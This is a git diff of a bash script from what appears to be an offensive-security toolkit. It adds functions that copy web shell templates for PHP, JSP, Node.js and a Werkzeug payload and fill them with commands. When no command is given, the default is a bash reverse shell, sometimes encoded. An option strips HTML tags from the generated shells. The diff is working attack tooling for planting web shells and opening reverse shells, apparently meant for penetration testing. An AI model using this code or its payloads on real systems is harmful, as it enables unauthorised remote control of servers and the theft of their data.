@@ -147,13 +147,25 @@ create_php_web_shell() {
     cmd_replacement=$(echo $cmd_replacement| sed -E s'/"/\\\\"/g')
     sed -E -i "s/\{cmd\}/$cmd_replacement/g" webshell.php
     
-    if [[ ! -z "$return_minimal" ]] && [[ "$return_minimal" == "true" ]]; then
+    if [[ ! -z "$minimize_webshell" ]] && [[ "$minimize_webshell" == "true" ]]; then
         sed -E -i '/html/d' webshell.php
         sed -E -i '/body/d' webshell.php
         sed -E -i '/title/d' webshell.php
         sed -E -i '/head/d' webshell.php
         sed -E -i '/pre/d' webshell.php        
     fi
+}
+
+create_werkzeug() {
+    cp $SCRIPTDIR/../python/werkzeug.py .
+    if [[ -z "$cmd" ]]; then
+        cmd=$(get_bash_reverse_shell)
+        cmd=$(encode_bash_payload "$cmd")
+    fi
+    local cmd_replacement=$(escape_sed "$cmd")
+    cmd_replacement=$(echo $cmd_replacement| sed -E s'/"/\\\\\\"/g')
+    sed -E -i "s/\{command\}/$cmd_replacement/g" werkzeug.py
+
 }
 
 create_python_upload() {
@@ -164,18 +176,33 @@ create_python_upload() {
 create_jsp_webshell() {
     cp $SCRIPTDIR/../jsp/webshell.jsp .
     if [ -z "$cmd" ]; then
+        reverse_type="java_exec"
         cmd=$(get_bash_reverse_shell)
     fi
     local cmd_replacement=$(escape_sed "$cmd")
     cmd_replacement=$(echo $cmd_replacement| sed -E s'/"/\\\\"/g')
     sed -E -i "s/\{cmd\}/$cmd_replacement/g" webshell.jsp
     
-    if [[ ! -z "$return_minimal" ]] && [[ "$return_minimal" == "true" ]]; then
+    if [[ ! -z "$minimize_webshell" ]] && [[ "$minimize_webshell" == "true" ]]; then
         sed -E -i '/html/d' webshell.jsp
         sed -E -i '/body/d' webshell.jsp
         sed -E -i '/title/d' webshell.jsp
         sed -E -i '/head/d' webshell.jsp
+        sed -E -i '/pre/d' webshell.jsp
+        sed -E -i '/h1/d' webshell.jsp
     fi
+}
+
+create_nodejs_webshell() {
+    cp $SCRIPTDIR/../js/node.js .
+    if [[ -z "$cmd" ]]; then
+        cmd=$(get_bash_reverse_shell)
+        encode_ifss=true
+        cmd=$(encode_bash_payload "$cmd")
+    fi
+    local cmd_replacement=$(escape_sed "$cmd")
+    sed -E -i "s/\{command\}/$cmd_replacement/g" node.js
+
 }
 
 run_curl() {
